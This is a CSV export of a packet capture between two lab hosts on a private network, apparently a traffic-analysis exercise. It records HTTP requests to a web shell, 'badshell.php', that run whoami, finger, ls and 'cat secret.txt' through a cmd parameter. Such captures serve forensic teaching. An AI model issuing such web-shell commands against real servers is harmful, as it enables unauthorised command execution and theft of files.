"No.","Time","Source","Destination","Protocol","Length","Info"
"5","0.000953","192.168.56.1","192.168.56.102","HTTP","415","GET / HTTP/1.1 "
"9","0.001836","192.168.56.102","192.168.56.1","HTTP","303","HTTP/1.1 200 OK  (text/html)"
"13","0.014101","192.168.56.1","192.168.56.102","HTTP","495","GET /icons/ubuntu-logo.png HTTP/1.1 "
"14","0.014501","192.168.56.102","192.168.56.1","HTTP","245","HTTP/1.1 304 Not Modified "
"15","0.014521","192.168.56.102","192.168.56.1","HTTP","245","[TCP Retransmission] HTTP/1.1 304 Not Modified "
"27","26.534356","192.168.56.1","192.168.56.102","HTTP","401","GET /badshell.php HTTP/1.1 "
"30","26.624255","192.168.56.102","192.168.56.1","HTTP","489","HTTP/1.1 200 OK  (text/html)"
"31","26.624266","192.168.56.102","192.168.56.1","HTTP","489","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"46","45.124604","192.168.56.1","192.168.56.102","HTTP","413","GET /badshell.php?/cmd=whoami HTTP/1.1 "
"49","45.125733","192.168.56.102","192.168.56.1","HTTP","489","HTTP/1.1 200 OK  (text/html)"
"50","45.125747","192.168.56.102","192.168.56.1","HTTP","489","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"62","54.512222","192.168.56.1","192.168.56.102","HTTP","412","GET /badshell.php?cmd=whoami HTTP/1.1 "
"65","54.522940","192.168.56.102","192.168.56.1","HTTP","435","HTTP/1.1 200 OK  (text/html)"
"66","54.522961","192.168.56.102","192.168.56.1","HTTP","435","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"78","60.397519","192.168.56.1","192.168.56.102","HTTP","412","GET /badshell.php?cmd=whoami HTTP/1.1 "
"81","60.410164","192.168.56.102","192.168.56.1","HTTP","435","HTTP/1.1 200 OK  (text/html)"
"82","60.410177","192.168.56.102","192.168.56.1","HTTP","435","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"90","63.745886","192.168.56.1","192.168.56.102","HTTP","412","GET /badshell.php?cmd=finger HTTP/1.1 "
"93","63.756435","192.168.56.102","192.168.56.1","HTTP","520","HTTP/1.1 200 OK  (text/html)"
"94","63.756466","192.168.56.102","192.168.56.1","HTTP","520","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"112","75.634583","192.168.56.1","192.168.56.102","HTTP","412","GET /badshell.php?cmd=finger HTTP/1.1 "
"115","75.638172","192.168.56.102","192.168.56.1","HTTP","520","HTTP/1.1 200 OK  (text/html)"
"116","75.638183","192.168.56.102","192.168.56.1","HTTP","520","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"122","78.142357","192.168.56.1","192.168.56.102","HTTP","408","GET /badshell.php?cmd=ls HTTP/1.1 "
"125","78.146761","192.168.56.102","192.168.56.1","HTTP","476","HTTP/1.1 200 OK  (text/html)"
"126","78.146777","192.168.56.102","192.168.56.1","HTTP","476","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"144","87.322022","192.168.56.1","192.168.56.102","HTTP","408","GET /badshell.php?cmd=ls HTTP/1.1 "
"147","87.325453","192.168.56.102","192.168.56.1","HTTP","476","HTTP/1.1 200 OK  (text/html)"
"148","87.325470","192.168.56.102","192.168.56.1","HTTP","476","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
"160","94.991149","192.168.56.1","192.168.56.102","HTTP","422","GET /badshell.php?cmd=cat%20secret.txt HTTP/1.1 "
"163","94.995997","192.168.56.102","192.168.56.1","HTTP","470","HTTP/1.1 200 OK  (text/html)"
"164","94.996015","192.168.56.102","192.168.56.1","HTTP","470","[TCP Retransmission] HTTP/1.1 200 OK  (text/html)"
